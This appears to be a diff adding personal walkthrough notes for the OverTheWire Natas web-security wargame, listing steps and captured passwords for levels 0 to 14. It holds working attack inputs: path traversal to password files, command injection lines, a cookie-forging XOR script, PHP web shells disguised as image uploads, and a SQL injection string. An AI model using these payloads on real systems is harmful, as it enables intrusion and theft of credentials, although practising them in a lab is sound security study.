@@ -1,0 +1,129 @@
+http://natasX.natas.labs.overthewire.org/
+user: natasX
+
+Cheat Sheets:
+https://jhalon.github.io/over-the-wire-natas1/
+https://jhalon.github.io/over-the-wire-natas2/
+https://jhalon.github.io/over-the-wire-natas3/
+
+Level 0:
+	(1) Right click
+	(2) Inspect Element
+	(3) <body> to <div id="content">
+
+gtVrDuiDfck831PqWsLEZy5gyDz1clto
+
+Level 1:
+	(1) Go through browser and find inspect element
+	(2) same as above
+
+ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi
+
+Level 2:
+	(1) add '/files/' to the end of the url - http://natas2.natas.labs.overthewire.org/files/
+
+sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
+
+Level 3:
+Hint: webcrawlers, robots.txt, http://www.robotstxt.org/robotstxt.html
+
+	(1) Add '/robots.txt' to the end of the url - http://natas3.natas.labs.overthewire.org/robots.txt
+	(2) copy the "disallowed" portion '/s3cr3t/' and add it to the end of the webpage - http://natas3.natas.labs.overthewire.org/s3cr3t/
+
+Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
+
+Level 4:
+Need to download burpsuite.
+(1) https://portswigger.net/burp/communitydownload
+(2) ./[file].sh
+(3) Proxy tab > Options tab 
+(4) Set up local host proxy in browser (firefox): find network proxy > select manual > HTTP proxy 127.0.0.1 on port 8080
+
+Refresh the page and change the REFERENCE from natas4 to natas5 and make sure it matches the link on the webpage.
+
+(1) https://portswigger.net/burp/communitydownload
+iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
+
+Level 5:
+	(1) intercept packet with burp suite
+	(2) switch "loginon=0" to "1"
+aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
+
+Level 6:
+	(1) Click "View sourcecode"
+	(2) Copy the PHP link "/include/secret.inc" and paste it at the end of the URL
+	(3) view source code of page and copy the key (FOEIUWGHFEEUHOFUOIU) and paste it into the text box
+7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
+
+Level 7:
+	(1) View source code-" hint: password for webuser natas8 is in /etc/natas_webpass/natas8"
+	(2) Click home/about and replace the last word "home" or "about" with the absolute location
+	(3) http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
+DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
+
+Level 8:
+	(1)	View source code
+	(2) open terminal and type "php -a"
+	(3) echo base64_decode(strrev(hex2bin('3d3d516343746d4d6d6c315669563362')));
+	(5) outputs > oubWYf2kBq
+W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
+
+Level 9:
+	(1) view source code > there is no input filtering so we can enter arbitrary code
+	(2) ; cat /etc/natas_webpass/natas10 #
+nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+
+Level 10:
+	(1) view source code > input validation but still a promblem with the way $key is being used
+	(2) .* /etc/natas_webpass/natas11 #
+U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
+
+Level 11:
+	(1) view the source code
+	(2) run burp suite to capture the packet
+	(3) create a new file and paste this script:
+#!/usr/bin/env php
+<?php
+function xor_encrypt($text) {
+    $key = 'qw8J';
+    $outText = '';
+ 
+    for($i=0;$i<strlen($text);$i++) {
+       $outText .= $text[$i] ^ $key[$i % strlen($key)];
+    }
+ 
+    return $outText;
+}
+ 
+$data = array("showpassword"=>"yes", "bgcolor"=>"#ffffff");
+print base64_encode(xor_encrypt(json_encode($data)));
+print "\n";
+?>
+
+	(4)run it, copy the output, replace the cookie with the output
+EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
+
+Level 12:
+	(1) Create a another text document and input the script and save:
+#!/usr/bin/env php
+<?php
+$output = shell_exec('cat /etc/natas_webpass/natas13');
+echo "<pre>$output</pre>";
+?>
+	(2) Go back to the web site, load of burp to intercept the packet, browse for the file, upload, look at burp suite and replace the .jpeg file with the name of the saved .php file
+jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
+
+Level 13:
+	(1)Same thing as above but use the code instead:
+BMP<?
+$output = shell_exec('cat /etc/natas_webpass/natas14');
+echo "<pre>$output</pre>";
+?>
+
+Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
+
+Level 14: vulnerable to sql injection
+	(1) type "=" for both user and pass
+AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
+
+Level 15:
